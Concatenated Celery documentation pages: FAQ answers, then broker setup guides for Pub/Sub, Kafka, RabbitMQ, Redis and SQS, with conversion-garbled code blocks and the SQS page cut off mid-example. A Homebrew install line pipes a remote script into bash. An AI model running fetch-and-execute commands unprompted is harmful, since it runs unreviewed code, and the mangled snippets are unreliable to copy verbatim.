A discussion on prefetch limits, and configuration settings for a worker that only reserves one task at a time is found here: \[optimizing-prefetch-limit\](\#optimizing-prefetch-limit).

### Can I change the interval of a periodic task at runtime?

**Answer**: Yes, you can use the Django database scheduler, or you can create a new schedule subclass and override \`\~celery.schedules.schedule.is\_due\`:

`` `python     from celery.schedules import schedule      class my_schedule(schedule):          def is_due(self, last_run_at):             return run_now, next_time_to_check  .. _faq-task-priorities:  Does Celery support task priorities? ``\` ------------------------------------

**Answer**: Yes, RabbitMQ supports priorities since version 3.5.0, and the Redis transport emulates priority support.

You can also prioritize work by routing high priority tasks to different workers. In the real world this usually works better than per message priorities. You can use this in combination with rate limiting, and per message priorities to achieve a responsive system.

### Should I use retry or acks\_late?

**Answer**: Depends. It's not necessarily one or the other, you may want to use both.

<span class="title-ref">Task.retry</span> is used to retry tasks, notably for expected errors that is catch-able with the `try` block. The AMQP transaction isn't used for these errors: **if the task raises an exception it's still acknowledged\!**

The <span class="title-ref">acks\_late</span> setting would be used when you need the task to be executed again if the worker (for some reason) crashes mid-execution. It's important to note that the worker isn't known to crash, and if it does it's usually an unrecoverable error that requires human intervention (bug in the worker, or task code).

In an ideal world you could safely retry any task that's failed, but this is rarely the case. Imagine the following task:

`` `python     @app.task     def process_upload(filename, tmpfile):         # Increment a file count stored in a database         increment_file_counter()         add_file_metadata_to_db(filename, tmpfile)         copy_file_to_destination(filename, tmpfile)  If this crashed in the middle of copying the file to its destination ``\` the world would contain incomplete state. This isn't a critical scenario of course, but you can probably imagine something far more sinister. So for ease of programming we have less reliability; It's a good default, users who require it and know what they are doing can still enable acks\_late (and in the future hopefully use manual acknowledgment).

In addition <span class="title-ref">Task.retry</span> has features not available in AMQP transactions: delay between retries, max retries, etc.

So use retry for Python errors, and if your task is idempotent combine that with <span class="title-ref">acks\_late</span> if that level of reliability is required.

### Can I schedule tasks to execute at a specific time?

**Answer**: Yes. You can use the <span class="title-ref">eta</span> argument of <span class="title-ref">Task.apply\_async</span>. Note that using distant <span class="title-ref">eta</span> times is not recommended, and in such case \[periodic tasks\<guide-beat\>\](\#periodic-tasks\<guide-beat\>) should be preferred.

See \[calling-eta\](\#calling-eta) for more details.

### Can I safely shut down the worker?

**Answer**: Yes, use the `TERM` signal.

This will tell the worker to finish all currently executing jobs and shut down as soon as possible. No tasks should be lost even with experimental transports as long as the shutdown completes.

You should never stop `~celery.bin.worker` with the `KILL` signal (`kill -9`), unless you've tried `TERM` a few times and waited a few minutes to let it get a chance to shut down.

Also make sure you kill the main worker process only, not any of its child processes. You can direct a kill signal to a specific child process if you know the process is currently executing a task the worker shutdown is depending on, but this also means that a `WorkerLostError` state will be set for the task so the task won't run again.

Identifying the type of process is easier if you have installed the `setproctitle` module:

`` `console     $ pip install setproctitle  With this library installed you'll be able to see the type of process in ``<span class="title-ref"> :command:\`ps</span> listings, but the worker must be restarted for this to take effect.

<div class="seealso">

\[worker-stopping\](\#worker-stopping)

</div>

### Can I run the worker in the background on \[platform\]?

**Answer**: Yes, please see \[daemonizing\](\#daemonizing).

## Django

### What purpose does the database tables created by `django-celery-beat` have?

When the database-backed schedule is used the periodic task schedule is taken from the `PeriodicTask` model, there are also several other helper tables (`IntervalSchedule`, `CrontabSchedule`, `PeriodicTasks`).

### What purpose does the database tables created by `django-celery-results` have?

The Django database result backend extension requires two extra models: `TaskResult` and `GroupResult`.

## Windows

### Does Celery support Windows?

**Answer**: No.

Since Celery 4.x, Windows is no longer supported due to lack of resources.

But it may still work and we are happy to accept patches.

---

gcpubsub.md

---

# Using Google Pub/Sub

<div class="versionadded">

5.5

</div>

## Installation

For the Google Pub/Sub support you have to install additional dependencies. You can install both Celery and these dependencies in one go using the `celery[gcpubsub]` \[bundle \<bundles\>\](\#bundle-\<bundles\>):

`` `console     $ pip install "celery[gcpubsub]"  .. _broker-gcpubsub-configuration:  Configuration ``\` =============

You have to specify gcpubsub and google project in the broker URL:

    broker_url = 'gcpubsub://projects/project-id'

where the URL format is:

`` `text     gcpubsub://projects/project-id  Please note that you must prefix the project-id with `projects/` in the URL.  The login credentials will be your regular GCP credentials set in the environment.  Options ``\` =======

### Resource expiry

The default settings are built to be as simple cost effective and intuitive as possible and to "just work". The pubsub messages and subscriptions are set to expire after 24 hours, and can be set by configuring the `expiration_seconds` setting:

    expiration_seconds = 86400

<div class="seealso">

An overview of Google Cloud Pub/Sub settings can be found here:

> <https://cloud.google.com/pubsub/docs>

</div>

### Ack Deadline Seconds

The <span class="title-ref">ack\_deadline\_seconds</span> defines the number of seconds pub/sub infra shall wait for the worker to acknowledge the task before the message is redelivered to another worker.

This option is set via the `broker_transport_options` setting:

    broker_transport_options = {'ack_deadline_seconds': 60}  # 1 minute.

The default visibility timeout is 240 seconds, and the worker takes care for automatically extending all pending messages it has.

<div class="seealso">

An overview of Pub/Sub deadline can be found here:

> <https://cloud.google.com/pubsub/docs/lease-management>

</div>

### Polling Interval

The polling interval decides the number of seconds to sleep between unsuccessful polls. This value can be either an int or a float. By default the value is *0.1 seconds*. However it doesn't mean that the worker will bomb the Pub/Sub API every 0.1 seconds when there's no more messages to read, since it will be blocked by a blocking call to the Pub/Sub API, which will only return when there's a new message to read or after 10 seconds.

The polling interval can be set via the `broker_transport_options` setting:

    broker_transport_options = {'polling_interval': 0.3}

Very frequent polling intervals can cause *busy loops*, resulting in the worker using a lot of CPU time. If you need sub-millisecond precision you should consider using another transport, like <span class="title-ref">RabbitMQ \<broker-amqp\></span>, or <span class="title-ref">Redis \<broker-redis\></span>.

### Queue Prefix

By default Celery will assign <span class="title-ref">kombu-</span> prefix to the queue names, If you have other services using Pub/Sub you can configure it do so using the `broker_transport_options` setting:

    broker_transport_options = {'queue_name_prefix': 'kombu-'}

### Results

Google Cloud Storage (GCS) could be a good candidate to store the results. See \[gcs\](\#gcs) for more information.

## Caveats

  - When using celery flower, an --inspect-timeout=10 option is required to detect workers state correctly.
  - GCP Subscriptions idle subscriptions (no queued messages) are configured to removal after 24hrs. This aims at reducing costs.
  - Queued and unacked messages are set to auto cleanup after 24 hrs. Same reason as above.
  - Channel queue size is approximation, and may not be accurate. The reason is that the Pub/Sub API does not provide a way to get the exact number of messages in a subscription.
  - Orphan (no subscriptions) Pub/Sub topics aren't being auto removed\!\! Since GCP introduces a hard limit of 10k topics per project, it is recommended to remove orphan topics manually in a periodic manner.
  - Max message size is limited to 10MB, as a workaround you can use GCS Backend to store the message in GCS and pass the GCS URL to the task.

---

index.md

---

# Backends and Brokers

  - Release  

  - Date  

Celery supports several message transport alternatives.

## Broker Instructions

<div class="toctree" data-maxdepth="1">

rabbitmq redis sqs kafka gcpubsub

</div>

## Broker Overview

This is comparison table of the different transports supports, more information can be found in the documentation for each individual transport (see \[broker\_toc\](\#broker\_toc)).

|              |              |                |                    |
| ------------ | ------------ | -------------- | ------------------ |
| **Name**     | **Status**   | **Monitoring** | **Remote Control** |
| *RabbitMQ*   | Stable       | Yes            | Yes                |
| *Redis*      | Stable       | Yes            | Yes                |
| *Amazon SQS* | Stable       | No             | No                 |
| *Zookeeper*  | Experimental | No             | No                 |
| *Kafka*      | Experimental | No             | No                 |
| *GC PubSub*  | Experimental | Yes            | Yes                |

Experimental brokers may be functional but they don't have dedicated maintainers.

Missing monitor support means that the transport doesn't implement events, and as such Flower, <span class="title-ref">celery events</span>, <span class="title-ref">celerymon</span> and other event-based monitoring tools won't work.

Remote control means the ability to inspect and manage workers at runtime using the <span class="title-ref">celery inspect</span> and <span class="title-ref">celery control</span> commands (and other tools using the remote control API).

## Summaries

*Note: This section is not comprehensive of backends and brokers.*

Celery has the ability to communicate and store with many different backends (Result Stores) and brokers (Message Transports).

### Redis

Redis can be both a backend and a broker.

**As a Broker:** Redis works well for rapid transport of small messages. Large messages can congest the system.

\[See documentation for details \<broker-redis\>\](\#see-documentation-for-details-\<broker-redis\>)

**As a Backend:** Redis is a super fast K/V store, making it very efficient for fetching the results of a task call. As with the design of Redis, you do have to consider the limit memory available to store your data, and how you handle data persistence. If result persistence is important, consider using another DB for your backend.

### RabbitMQ

RabbitMQ is a broker.

**As a Broker:** RabbitMQ handles larger messages better than Redis, however if many messages are coming in very quickly, scaling can become a concern and Redis or SQS should be considered unless RabbitMQ is running at very large scale.

\[See documentation for details \<broker-rabbitmq\>\](\#see-documentation-for-details-\<broker-rabbitmq\>)

**As a Backend:** RabbitMQ can store results via `rpc://` backend. This backend creates separate temporary queue for each client.

*Note: RabbitMQ (as the broker) and Redis (as the backend) are very commonly used together. If more guaranteed long-term persistence is needed from the result store, consider using PostgreSQL or MySQL (through SQLAlchemy), Cassandra, or a custom defined backend.*

### SQS

SQS is a broker.

If you already integrate tightly with AWS, and are familiar with SQS, it presents a great option as a broker. It is extremely scalable and completely managed, and manages task delegation similarly to RabbitMQ. It does lack some of the features of the RabbitMQ broker such as `worker remote control commands`.

\[See documentation for details \<broker-sqs\>\](\#see-documentation-for-details-\<broker-sqs\>)

### SQLAlchemy

SQLAlchemy is a backend.

It allows Celery to interface with MySQL, PostgreSQL, SQlite, and more. It is an ORM, and is the way Celery can use a SQL DB as a result backend.

\[See documentation for details \<conf-database-result-backend\>\](\#see-documentation-for-details-\<conf-database-result-backend\>)

### GCPubSub

Google Cloud Pub/Sub is a broker.

If you already integrate tightly with Google Cloud, and are familiar with Pub/Sub, it presents a great option as a broker. It is extremely scalable and completely managed, and manages task delegation similarly to RabbitMQ.

\[See documentation for details \<broker-gcpubsub\>\](\#see-documentation-for-details-\<broker-gcpubsub\>)

---

kafka.md

---

# Using Kafka

## Configuration

For celeryconfig.py:

`` `python     import os      task_serializer = 'json'     broker_transport_options = {         # "allow_create_topics": True,     }     broker_connection_retry_on_startup = True      # For using SQLAlchemy as the backend     # result_backend = 'db+postgresql://postgres:example@localhost/postgres'      broker_transport_options.update({         "security_protocol": "SASL_SSL",         "sasl_mechanism": "SCRAM-SHA-512",     })     sasl_username = os.environ["SASL_USERNAME"]     sasl_password = os.environ["SASL_PASSWORD"]     broker_url = f"confluentkafka://{sasl_username}:{sasl_password}@broker:9094"     broker_transport_options.update({         "kafka_admin_config": {             "sasl.username": sasl_username,             "sasl.password": sasl_password,         },         "kafka_common_config": {             "sasl.username": sasl_username,             "sasl.password": sasl_password,             "security.protocol": "SASL_SSL",             "sasl.mechanism": "SCRAM-SHA-512",             "bootstrap_servers": "broker:9094",         }     })  Please note that "allow_create_topics" is needed if the topic does not exist ``\` yet but is not necessary otherwise.

For tasks.py:

`` `python     from celery import Celery      app = Celery('tasks')     app.config_from_object('celeryconfig')       @app.task     def add(x, y):         return x + y  Auth ``\` ====

See above. The SASL username and password are passed in as environment variables.

## Further Info

Celery queues get routed to Kafka topics. For example, if a queue is named "add\_queue", then a topic named "add\_queue" will be created/used in Kafka.

For canvas, when using a backend that supports it, the typical mechanisms like chain, group, and chord seem to work.

## Limitations

Currently, using Kafka as a broker means that only one worker can be used. See <https://github.com/celery/kombu/issues/1785>.

---

rabbitmq.md

---

# Using RabbitMQ

<div class="contents" data-local="">

</div>

## Installation & Configuration

RabbitMQ is the default broker so it doesn't require any additional dependencies or initial configuration, other than the URL location of the broker instance you want to use:

`` `python     broker_url = 'amqp://myuser:mypassword@localhost:5672/myvhost'  For a description of broker URLs and a full list of the ``\` various broker configuration options available to Celery, see \[conf-broker-settings\](\#conf-broker-settings), and see below for setting up the username, password and vhost.

## Installing the RabbitMQ Server

See [Downloading and Installing RabbitMQ](https://www.rabbitmq.com/download.html) over at RabbitMQ's website. For macOS see [Installing RabbitMQ on macOS]().

\> **Note** \> If you're getting <span class="title-ref">nodedown</span> errors after installing and using `rabbitmqctl` then this blog post can help you identify the source of the problem:

> <http://www.somic.org/2009/02/19/on-rabbitmqctl-and-badrpcnodedown/>

### Setting up RabbitMQ

To use Celery we need to create a RabbitMQ user, a virtual host and allow that user access to that virtual host:

`` `console     $ sudo rabbitmqctl add_user myuser mypassword  .. code-block:: console      $ sudo rabbitmqctl add_vhost myvhost  .. code-block:: console      $ sudo rabbitmqctl set_user_tags myuser mytag  .. code-block:: console      $ sudo rabbitmqctl set_permissions -p myvhost myuser ".*" ".*" ".*"  Substitute in appropriate values for ``myuser`,`mypassword`and`myvhost``above.  See the RabbitMQ `Admin Guide`_ for more information about `access control`_.      .. _rabbitmq-macOS-installation:  Installing RabbitMQ on macOS``\` ----------------------------

The easiest way to install RabbitMQ on macOS is using [Homebrew](https://github.com/mxcl/homebrew/) the new and shiny package management system for macOS.

First, install Homebrew using the one-line command provided by the [Homebrew documentation]():

`` `console     /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"  Finally, we can install RabbitMQ using :command:`brew`:  .. code-block:: console      $ brew install rabbitmq ``\` .. \_\`Homebrew documentation\`: <https://github.com/Homebrew/homebrew/wiki/Installation>

<div id="rabbitmq-macOS-system-hostname">

After you've installed RabbitMQ with `brew` you need to add the following to your path to be able to start and stop the broker: add it to the start-up file for your shell (e.g., `.bash_profile` or `.profile`).

</div>

`` `bash     PATH=$PATH:/usr/local/sbin  Configuring the system host name ``\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

If you're using a DHCP server that's giving you a random host name, you need to permanently configure the host name. This is because RabbitMQ uses the host name to communicate with nodes.

Use the `scutil` command to permanently set your host name:

`` `console     $ sudo scutil --set HostName myhost.local  Then add that host name to :file:`/etc/hosts` so it's possible to resolve it ``\` back into an IP address:

    127.0.0.1       localhost myhost myhost.local

If you start the `rabbitmq-server`, your rabbit node should now be <span class="title-ref">rabbit@myhost</span>, as verified by `rabbitmqctl`:

`` `console     $ sudo rabbitmqctl status     Status of node rabbit@myhost ...     [{running_applications,[{rabbit,"RabbitMQ","1.7.1"},                         {mnesia,"MNESIA  CXC 138 12","4.4.12"},                         {os_mon,"CPO  CXC 138 46","2.2.4"},                         {sasl,"SASL  CXC 138 11","2.1.8"},                         {stdlib,"ERTS  CXC 138 10","1.16.4"},                         {kernel,"ERTS  CXC 138 10","2.13.4"}]},     {nodes,[rabbit@myhost]},     {running_nodes,[rabbit@myhost]}]     ...done.  This is especially important if your DHCP server gives you a host name ``<span class="title-ref"> starting with an IP address, (e.g., \`23.10.112.31.comcast.net</span>). In this case RabbitMQ will try to use \`<rabbit@23>\`: an illegal host name.

#### Starting/Stopping the RabbitMQ server

To start the server:

`` `console     $ sudo rabbitmq-server  you can also run it in the background by adding the ``-detached`option`\` (note: only one dash):

`` `console     $ sudo rabbitmq-server -detached  Never use :command:`kill` (:manpage:`kill(1)`) to stop the RabbitMQ server, ``<span class="title-ref"> but rather use the :command:\`rabbitmqctl</span> command:

`` `console     $ sudo rabbitmqctl stop  When the server is running, you can continue reading `Setting up RabbitMQ`_.  .. _using-quorum-queues:  Using Quorum Queues ``\` ===================

<div class="versionadded">

5.5

</div>

\> **Warning** \> Quorum Queues require disabling global QoS which means some features won't work as expected. See [limitations](#limitations) for details.

  - Celery supports [Quorum Queues](https://www.rabbitmq.com/docs/quorum-queues) by setting the `x-queue-type` header to ``quorum` like so:``\`python  
    from kombu import Queue
    
    task\_queues = \[Queue('my-queue', queue\_arguments={'x-queue-type': 'quorum'})\] broker\_transport\_options = {"confirm\_publish": True}

If you'd like to change the type of the default queue, set the `task_default_queue_type` setting to `quorum`.

Celery automatically detects if quorum queues are used using the `worker_detect_quorum_queues` setting. `` ` We recommend to keep the default behavior turned on.  To migrate from classic mirrored queues to quorum queues, please refer to RabbitMQ's `documentation <https://www.rabbitmq.com/blog/2023/03/02/quorum-queues-migration>`_ on the subject.    .. _limitations:  Limitations -----------  Disabling global QoS means that the the per-channel QoS is now static. This means that some Celery features won't work when using Quorum Queues.  Autoscaling relies on increasing and decreasing the prefetch count whenever a new process is instantiated or terminated so it won't work when Quorum Queues are detected.  Similarly, the :setting:`worker_enable_prefetch_count_reduction` setting will be a no-op even when set to ``True\`\` when Quorum Queues are detected.

In addition, \[ETA/Countdown \<calling-eta\>\](\#eta/countdown-\<calling-eta\>) will block the worker when received until the ETA arrives since we can no longer increase the prefetch count and fetch another task from the queue.

In order to properly schedule ETA/Countdown tasks we automatically detect if quorum queues are used and in case they are, Celery automatically enables \[Native Delayed Delivery \<native-delayed-delivery\>\](\#native-delayed-delivery-\<native-delayed-delivery\>).

### Native Delayed Delivery

Since tasks with ETA/Countdown will block the worker until they are scheduled for execution, we need to use RabbitMQ's native capabilities to schedule the execution of tasks.

The design is borrowed from NServiceBus. If you are interested in the implementation details, refer to their [documentation](https://docs.particular.net/transports/rabbitmq/delayed-delivery).

Native Delayed Delivery is automatically enabled when quorum queues are detected.

---

redis.md

---

# Using Redis

## Installation

For the Redis support you have to install additional dependencies. You can install both Celery and these dependencies in one go using the `celery[redis]` \[bundle \<bundles\>\](\#bundle-\<bundles\>):

`` `console     $ pip install -U "celery[redis]"  .. _broker-redis-configuration:  Configuration ``\` =============

Configuration is easy, just configure the location of your Redis database:

`` `python     app.conf.broker_url = 'redis://localhost:6379/0'  Where the URL is in the format of:  .. code-block:: text      redis://:password@hostname:port/db_number  all fields after the scheme are optional, and will default to ``localhost`  `\` on port 6379, using database 0.

If a Unix socket connection should be used, the URL needs to be in the format:

`` `text     redis+socket:///path/to/redis.sock  Specifying a different database number when using a Unix socket is possible ``<span class="title-ref"> by adding the </span><span class="title-ref">virtual\_host</span>\` parameter to the URL:

`` `text     redis+socket:///path/to/redis.sock?virtual_host=db_number  It is also easy to connect directly to a list of Redis Sentinel:  .. code-block:: python      app.conf.broker_url = 'sentinel://localhost:26379;sentinel://localhost:26380;sentinel://localhost:26381'     app.conf.broker_transport_options = { 'master_name': "cluster1" }  Additional options can be passed to the Sentinel client using ``sentinel\_kwargs`:  .. code-block:: python      app.conf.broker_transport_options = { 'sentinel_kwargs': { 'password': "password" } }  .. _redis-visibility_timeout:  Visibility Timeout`\` ------------------

The visibility timeout defines the number of seconds to wait for the worker to acknowledge the task before the message is redelivered to another worker. Be sure to see \[redis-caveats\](\#redis-caveats) below.

This option is set via the `broker_transport_options` setting:

`` `python     app.conf.broker_transport_options = {'visibility_timeout': 3600}  # 1 hour.  The default visibility timeout for Redis is 1 hour.  .. _redis-results-configuration:  Results ``\` -------

If you also want to store the state and return values of tasks in Redis, you should configure these settings:

    app.conf.result_backend = 'redis://localhost:6379/0'

For a complete list of options supported by the Redis result backend, see \[conf-redis-result-backend\](\#conf-redis-result-backend).

If you are using Sentinel, you should specify the master\_name using the `result_backend_transport_options` setting:

`` `python     app.conf.result_backend_transport_options = {'master_name': "mymaster"}  .. _redis-result-backend-global-keyprefix:  Global keyprefix ``\` ^^^^^^^^^^^^^^^^

The global key prefix will be prepended to all keys used for the result backend, which can be useful when a redis database is shared by different users. By default, no prefix is prepended.

To configure the global keyprefix for the Redis result backend, use the `global_keyprefix` key under `result_backend_transport_options`:

`` `python     app.conf.result_backend_transport_options = {         'global_keyprefix': 'my_prefix_'     }  .. _redis-result-backend-timeout:  Connection timeouts ``\` ^^^^^^^^^^^^^^^^^^^

To configure the connection timeouts for the Redis result backend, use the `retry_policy` key under `result_backend_transport_options`:

`` `python     app.conf.result_backend_transport_options = {         'retry_policy': {            'timeout': 5.0         }     }  See `~kombu.utils.functional.retry_over_time` for the possible retry policy options.  .. _redis-serverless:  Serverless ``\` ==========

Celery supports utilizing a remote serverless Redis, which can significantly reduce the operational overhead and cost, making it a favorable choice in microservice architectures or environments where minimizing operational expenses is crucial. Serverless Redis provides the necessary functionalities without the need for manual setup, configuration, and management, thus aligning well with the principles of automation and scalability that Celery promotes.

### Upstash

[Upstash](http://upstash.com/?code=celery) offers a serverless Redis database service, providing a seamless solution for Celery users looking to leverage serverless architectures. Upstash's serverless Redis service is designed with an eventual consistency model and durable storage, facilitated through a multi-tier storage architecture.

Integration with Celery is straightforward as demonstrated in an [example provided by Upstash](https://github.com/upstash/examples/tree/main/examples/using-celery).

## Caveats

### Visibility timeout

If a task isn't acknowledged within the \[redis-visibility\_timeout\](\#redis-visibility\_timeout) the task will be redelivered to another worker and executed.

This causes problems with ETA/countdown/retry tasks where the time to execute exceeds the visibility timeout; in fact if that happens it will be executed again, and again in a loop.

To remediate that, you can increase the visibility timeout to match the time of the longest ETA you're planning to use. However, this is not recommended as it may have negative impact on the reliability. Celery will redeliver messages at worker shutdown, so having a long visibility timeout will only delay the redelivery of 'lost' tasks in the event of a power failure or forcefully terminated workers.

Broker is not a database, so if you are in need of scheduling tasks for a more distant future, database-backed periodic task might be a better choice. Periodic tasks won't be affected by the visibility timeout, as this is a concept separate from ETA/countdown.

You can increase this timeout by configuring all of the following options with the same name (required to set all of them):

`` `python     app.conf.broker_transport_options = {'visibility_timeout': 43200}     app.conf.result_backend_transport_options = {'visibility_timeout': 43200}     app.conf.visibility_timeout = 43200  The value must be an int describing the number of seconds.  Note: If multiple applications are sharing the same Broker, with different settings, the _shortest_ value will be used. ``\` This include if the value is not set, and the default is sent

### Soft Shutdown

During \[shutdown \<worker-stopping\>\](\#shutdown-\<worker-stopping\>), the worker will attempt to re-queue any unacknowledged messages with `task_acks_late` enabled. However, if the worker is terminated forcefully (\[cold shutdown \<worker-cold-shutdown\>\](\#cold-shutdown-\<worker-cold-shutdown\>)), the worker might not be able to re-queue the tasks on time, and they will not be consumed again until the \[redis-visibility\_timeout\](\#redis-visibility\_timeout) has passed. This creates a problem when the \[redis-visibility\_timeout\](\#redis-visibility\_timeout) is very high and a worker needs to shut down just after it has received a task. If the task is not re-queued in such case, it will need to wait for the long visibility timeout to pass before it can be consumed again, leading to potentially very long delays in tasks execution.

The \[soft shutdown \<worker-soft-shutdown\>\](\#soft-shutdown-\<worker-soft-shutdown\>) introduces a time-limited warm shutdown phase just before the \[cold shutdown \<worker-cold-shutdown\>\](\#cold-shutdown-\<worker-cold-shutdown\>). This time window significantly increases the chances of re-queuing the tasks during shutdown which mitigates the problem of long visibility timeouts.

To enable the \[soft shutdown \<worker-soft-shutdown\>\](\#soft-shutdown-\<worker-soft-shutdown\>), set the `worker_soft_shutdown_timeout` to a value greater than 0. The value must be an float describing the number of seconds. During this time, the worker will continue to process the running tasks until the timeout expires, after which the \[cold shutdown \<worker-cold-shutdown\>\](\#cold-shutdown-\<worker-cold-shutdown\>) will be initiated automatically to terminate the worker gracefully.

If the \[REMAP\_SIGTERM \<worker-REMAP\_SIGTERM\>\](\#remap\_sigterm-\<worker-remap\_sigterm\>) is configured to SIGQUIT in the environment variables, and the `worker_soft_shutdown_timeout` is set, the worker will initiate the \[soft shutdown \<worker-soft-shutdown\>\](\#soft-shutdown-\<worker-soft-shutdown\>) when it receives the `TERM` signal (*and* the `QUIT` signal).

### Key eviction

Redis may evict keys from the database in some situations

If you experience an error like:

`` `text     InconsistencyError: Probably the key ('_kombu.binding.celery') has been     removed from the Redis database.  then you may want to configure the :command:`redis-server` to not evict keys ``\` by setting in the redis configuration file:

  - the `maxmemory` option
  - the `maxmemory-policy` option to `noeviction` or `allkeys-lru`

See Redis server documentation about Eviction Policies for details:

> <https://redis.io/topics/lru-cache>

### Group result ordering

Versions of Celery up to and including 4.4.6 used an unsorted list to store result objects for groups in the Redis backend. This can cause those results to be be returned in a different order to their associated tasks in the original group instantiation. Celery 4.4.7 introduced an opt-in behaviour which fixes this issue and ensures that group results are returned in the same order the tasks were defined, matching the behaviour of other backends. In Celery 5.0 this behaviour was changed to be opt-out. The behaviour is controlled by the <span class="title-ref">result\_chord\_ordered</span> configuration option which may be set like so:

`` `python     # Specifying this for workers running Celery 4.4.6 or earlier has no effect     app.conf.result_backend_transport_options = {         'result_chord_ordered': True    # or False     }  This is an incompatible change in the runtime behaviour of workers sharing the ``<span class="title-ref"> same Redis backend for result storage, so all workers must follow either the new or old behaviour to avoid breakage. For clusters with some workers running Celery 4.4.6 or earlier, this means that workers running 4.4.7 need no special configuration and workers running 5.0 or later must have \`result\_chord\_ordered</span> set to <span class="title-ref">False</span>. For clusters with no workers running 4.4.6 or earlier but some workers running 4.4.7, it is recommended that <span class="title-ref">result\_chord\_ordered</span> be set to <span class="title-ref">True</span> for all workers to ease future migration. Migration between behaviours will disrupt results currently held in the Redis backend and cause breakage if downstream tasks are run by migrated workers - plan accordingly.

---

sqs.md

---

# Using Amazon SQS

## Installation

For the Amazon SQS support you have to install additional dependencies. You can install both Celery and these dependencies in one go using the `celery[sqs]` \[bundle \<bundles\>\](\#bundle-\<bundles\>):

`` `console     $ pip install "celery[sqs]"  .. _broker-sqs-configuration:  Configuration ``\` =============

You have to specify SQS in the broker URL:

    broker_url = 'sqs://ABCDEFGHIJKLMNOPQRST:ZYXK7NiynGlTogH8Nj+P9nlE73sq3@'

where the URL format is:

`` `text     sqs://aws_access_key_id:aws_secret_access_key@  Please note that you must remember to include the ``@`sign at the end and`\` encode the password so it can always be parsed correctly. For example:

`` `python     from kombu.utils.url import safequote      aws_access_key = safequote("ABCDEFGHIJKLMNOPQRST")     aws_secret_key = safequote("ZYXK7NiynG/TogH8Nj+P9nlE73sq3")      broker_url = "sqs://{aws_access_key}:{aws_secret_key}@".format(         aws_access_key=aws_access_key, aws_secret_key=aws_secret_key,     )  > **Warning** >      Don't use this setup option with django's ``debug=True`.     It may lead to security issues within deployed django apps.      In debug mode django shows environment variables and the SQS URL     may be exposed to the internet including your AWS access and secret keys.     Please turn off debug mode on your deployed django application or     consider a setup option described below.   The login credentials can also be set using the environment variables`<span class="title-ref"> :envvar:\`AWS\_ACCESS\_KEY\_ID</span> and `AWS_SECRET_ACCESS_KEY`, in that case the broker URL may only be `sqs://`.

If you are using IAM roles on instances, you can set the BROKER\_URL to: `sqs://` and kombu will attempt to retrieve access tokens from the instance metadata.

## Options

### Region

The default region is `us-east-1` but you can select another region by configuring the `broker_transport_options` setting:

    broker_transport_options = {'region': 'eu-west-1'}

<div class="seealso">

An overview of Amazon Web Services regions can be found here:

> <http://aws.amazon.com/about-aws/globalinfrastructure/>

</div>

### Visibility Timeout

The visibility timeout defines the number of seconds to wait for the worker to acknowledge the task before the message is redelivered to another worker. Also see caveats below.

This option is set via the `broker_transport_options` setting:

    broker_transport_options = {'visibility_timeout': 3600}  # 1 hour.

The default visibility timeout is 30 minutes.

This option is used when creating the SQS queue and has no effect if using \[predefined queues \<predefined-queues\>\](\#predefined-queues-\<predefined-queues\>).

### Polling Interval

The polling interval decides the number of seconds to sleep between unsuccessful polls. This value can be either an int or a float. By default the value is *one second*: this means the worker will sleep for one second when there's no more messages to read.

You must note that **more frequent polling is also more expensive, so increasing the polling interval can save you money**.

The polling interval can be set via the `broker_transport_options` setting:

    broker_transport_options = {'polling_interval': 0.3}

Very frequent polling intervals can cause *busy loops*, resulting in the worker using a lot of CPU time. If you need sub-millisecond precision you should consider using another transport, like <span class="title-ref">RabbitMQ \<broker-amqp\></span>, or <span class="title-ref">Redis \<broker-redis\></span>.

### Long Polling

[SQS Long Polling](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-long-polling.html) is enabled by default and the `WaitTimeSeconds` parameter of [ReceiveMessage](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/APIReference/API_ReceiveMessage.html) operation is set to 10 seconds.

The value of `WaitTimeSeconds` parameter can be set via the `broker_transport_options` setting:

    broker_transport_options = {'wait_time_seconds': 15}

Valid values are 0 to 20. Note that newly created queues themselves (also if created by Celery) will have the default value of 0 set for the "Receive Message Wait Time" queue property.

### Queue Prefix

By default Celery won't assign any prefix to the queue names, If you have other services using SQS you can configure it do so using the `broker_transport_options` setting:

    broker_transport_options = {'queue_name_prefix': 'celery-'}

### Predefined Queues

If you want Celery to use a set of predefined queues in AWS, and to never attempt to list SQS queues, nor attempt to create or delete them, pass a map of queue names to URLs using the `predefined_queues` setting:

    broker_transport_options = {
        'predefined_queues': {
            'my-q': {
                'url': 'https://ap-southeast-2.queue.amazonaws.com/123456/my-q',
                'access_key_id': 'xxx',
                'secret_access_key': 'xxx',
            }
        }
    }

When using this option, the visibility timeout should be set in the SQS queue (in AWS) rather than via the \[visibility timeout \<sqs-visibility-timeout\>\](\#visibility-timeout-\<sqs-visibility-timeout\>) option.

### Back-off policy

Back-off policy is using SQS visibility timeout mechanism altering the time difference between task retries. The mechanism changes message specific `visibility timeout` from queue `Default visibility timeout` to policy configured timeout. The number of retries is managed by SQS (specifically by the `ApproximateReceiveCount` message attribute) and no further action is required by the user.

Configuring the queues and backoff policy:

    broker_transport_options = {
        'predefined_queues': {
            'my-q': {
                'url': 'https://ap-southeast-2.queue.amazonaws.com/123456/my-q',
                'access_key_id': 'xxx',
                'secret_access_key': 'xxx',
                'backoff_policy': {1: 10, 2: 20, 3: 40, 4: 80, 5: 320, 6: 640},
                'backoff_tasks': ['svc.tasks.tasks.task1']
            }
        }
    }

`backoff_policy` dictionary where key is number of retries, and value is delay seconds between retries (i.e SQS visibility timeout) `backoff_tasks` list of task names to apply the above policy

The above policy:

|               |             |
| ------------- | ----------- |
| **Attempt**   | **Delay**   |
| `2nd attempt` | 20 seconds  |
| `3rd attempt` | 40 seconds  |
| `4th attempt` | 80 seconds  |
| `5th attempt` | 320 seconds |
| `6th attempt` | 640 seconds |

### STS token authentication

<https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role.html>

AWS STS authentication is supported by using the `sts_role_arn` and `sts_token_timeout` broker transport options. `sts_role_arn` is the assumed IAM role ARN we use to authorize our access to SQS. `sts_token_timeout` is the token timeout, defaults (and minimum) to 900 seconds. After the mentioned period, a new token will be created:

    broker_transport_options = {
        'predefined_queues': {
            'my-q': {
                'url': 'https://ap-southeast-2.queue.amazonaws.com/123456/my-q',
                'access_key_id': 'xxx',
                'secret_access_key': 'xxx',
